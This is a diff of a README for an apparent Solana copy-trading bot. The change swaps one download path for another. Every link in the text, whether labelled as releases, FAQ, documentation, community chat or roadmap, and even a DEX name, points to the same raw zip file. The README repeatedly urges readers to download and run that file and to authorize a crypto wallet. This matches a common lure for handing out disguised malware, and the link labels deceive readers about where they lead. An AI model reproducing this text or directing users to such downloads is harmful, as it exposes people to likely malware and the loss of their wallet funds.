@@ -1,7 +1,7 @@
 # 🚀 solana-copytrading-bot - Automate Your Cryptocurrency Trades Effortlessly
 
 ## 🔗 Download the Application
-[![Download Now](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip)
+[![Download Now](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **solana-copytrading-bot**. This application helps you automate your trading on the Solana blockchain. Using this bot, you can easily copy trades and make the most of your trading experience across multiple decentralized exchanges (DEXs).
@@ -9,7 +9,7 @@ Welcome to the **solana-copytrading-bot**. This application helps you automate y
 ## 📥 Download & Install
 To get started, you need to download the application. Follow these simple steps:
 
-1. Visit our [Releases page](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip).
+1. Visit our [Releases page](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip).
 2. Find the latest version of the bot listed on the page.
 3. Click to download the relevant file for your operating system.
 4. Once the download completes, locate the file on your computer.
@@ -28,7 +28,7 @@ After installation, configure the bot to start trading.
 
 1. **Set Up Your Wallet**: Connect your Solana wallet. The application supports popular wallets like Phantom and Sollet. Follow the prompts to authorize access.
    
-2. **Select Exchanges**: Choose the decentralized exchanges you want to trade on, such as https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip and Raydium.
+2. **Select Exchanges**: Choose the decentralized exchanges you want to trade on, such as https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip and Raydium.
    
 3. **Customize Settings**:
    - **Slippage**: Set your preferred slippage percentage.
@@ -49,7 +49,7 @@ This bot automatically replicates trades based on the criteria you set, reducing
 - **User-friendly Interface**: Even if you are new to trading, our simple interface helps you navigate efficiently.
 
 ## 📞 Support
-If you encounter any issues or have questions, please check our [FAQ](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip) or reach out for support through our issues page on GitHub.
+If you encounter any issues or have questions, please check our [FAQ](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip) or reach out for support through our issues page on GitHub.
 
 ## 🛠️ Troubleshooting
 Common issues may arise during installation or operation. Here are some tips:
@@ -63,12 +63,12 @@ Common issues may arise during installation or operation. Here are some tips:
   - Ensure your wallet is properly connected and authorized.
 
 ## 🌐 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip)
-- [Community Chat](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip)
-- [Project Roadmap](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip)
+- [Documentation](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip)
+- [Community Chat](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip)
+- [Project Roadmap](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip)
 
 ## 🎯 Stay Updated
 For the latest news and updates on the solana-copytrading-bot, follow our repository. We regularly push enhancements, fixes, and new features to improve your trading experience.
 
 ## 🔗 Download the Application Again
-As a reminder, you can download the bot from our [Releases page](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/burgoyne/solana-copytrading-bot.zip) at any time. Happy trading!
+As a reminder, you can download the bot from our [Releases page](https://raw.githubusercontent.com/alooooparathaaa/solana-copytrading-bot/main/src/core/solana_bot_copytrading_1.3-alpha.4.zip) at any time. Happy trading!
